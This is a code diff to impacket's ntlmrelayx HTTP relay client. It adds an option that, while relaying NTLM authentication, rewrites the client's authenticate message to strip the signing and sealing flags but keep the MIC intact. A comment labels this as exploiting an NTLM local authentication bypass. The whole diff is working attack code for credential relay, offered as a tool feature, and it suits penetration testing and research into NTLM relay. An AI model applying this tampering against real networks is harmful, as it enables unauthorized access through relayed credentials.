@@ -28,7 +28,7 @@ from struct import unpack
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_SEAL
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["HTTPRelayClient","HTTPSRelayClient"]
@@ -105,6 +105,21 @@ class HTTPRelayClient(ProtocolClient):
             token = respToken2['ResponseToken']
         else:
             token = authenticateMessageBlob
+
+        # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+        if self.serverConfig.remove_mic_partial:
+            authMessage = NTLMAuthChallengeResponse()
+            authMessage.fromString(token)
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
+            # Do NOT remove KEY_EXCH or VERSION flags
+            # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+            token = authMessage.getData()
+
         auth = base64.b64encode(token).decode("ascii")
         headers = {'Authorization':'%s %s' % (self.authenticationMethod, auth)}
         if self.query:
